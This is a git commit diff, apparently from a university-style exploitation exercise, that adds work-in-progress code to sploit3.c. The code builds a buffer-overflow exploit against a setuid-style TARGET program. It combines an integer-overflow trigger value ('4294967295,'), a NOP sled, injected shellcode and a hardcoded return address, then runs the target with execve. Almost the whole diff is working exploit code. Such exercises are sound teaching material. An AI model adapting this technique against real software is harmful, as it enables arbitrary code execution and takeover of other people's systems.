bf8b061139514ddd2ca9e3295c2f10db476e4c57
Peter C <peter@drifty.com>
2014-02-10 09:15:26 -0800

    sploit 3 wip with integer overflow

--- sploits/sploit3.c
+++ sploits/sploit3.c
@@ -10,8 +10,18 @@ int main(void)
 {
   char *args[3];
   char *env[1];
+  char buf[241*20];
+  memset(buf, 0x90, 241*20);
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  strncpy(buf, "4294967295,", 11);
+  strncpy(buf+(235*20), shellcode, 45);
+  //strncpy(buf+240, "\x70", 1);
+  strncpy(buf+(240*20)+4, "\x08\xfd\xff\xbf", 4);
+  //strncpy(buf+244, "\x12\x34\x56\x78", 4);
+  
+  args[0] = TARGET; 
+  args[1] = buf;
+  args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
